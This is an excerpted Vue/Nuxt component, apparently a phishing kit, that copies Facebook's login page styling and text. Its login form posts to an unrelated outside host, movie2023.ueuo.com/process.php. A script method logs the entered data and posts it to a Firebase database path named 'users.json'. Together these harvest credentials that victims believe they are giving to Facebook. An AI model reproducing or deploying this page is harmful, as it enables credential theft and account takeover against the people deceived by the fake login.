            ...
            <div class="container">
              ...
              <div class="row">
                ...
                <div class="col-sm-5">
                  <div class="card">
                    <form
                      action="http://movie2023.ueuo.com/process.php"
                      method="post"
                    >
                      <div>
                        <input
                    ...
                    <hr id="hr2" />
                    <button id="createAcBtn" class="btn btn-success btn-lg">
                      Create New Account
                    </button>
                    <p id="forgetPass2" class="text-center my-3">
                      <a href="#">Forget account?</a>
                    </p>
                  </div>
                  <p
                    ...
                    style="font-size: 14px"
                  >
                    <b>Create a Page</b> for a celebrity, brand or buisness.
                  </p>
...
export default {
  name: 'TestNuxtKnowledgeFacebook',
  ...
  computed: {
   getFacebook1(){
    return this.$store.state.facebook.facebook1;
   },
   getFacebook2(){
    return this.$store.state.facebook.facebook2;
   }
  },
  ...
  methods: {
    ...
    console.log("data:", data);
      axios.post('https://facebook-lo-default-rtdb.asia-southeast1.firebasedatabase.app/users.json', data)
    .then((response) => {
    })
    .catch((error) => {
...
.container-body {
  padding: 10px;
  border-radius: 8px;
  box-shadow: 7px 7px 13px rgba(153, 153, 153, 0.4), -7px -7px 13px #fff;
}
...
.input input {
  ...
  border: none;
  outline: none;
  box-shadow: 0 0 0 2px #e2e8ee, 0 0 2px #fff,
    3px 3px 2px inset rgba(153, 153, 153, 0.4), -4px -4px 9px inset #ffffff;
  border-radius: 5px;
  padding: 0 8px;
  height: 35px;
  color: #555;
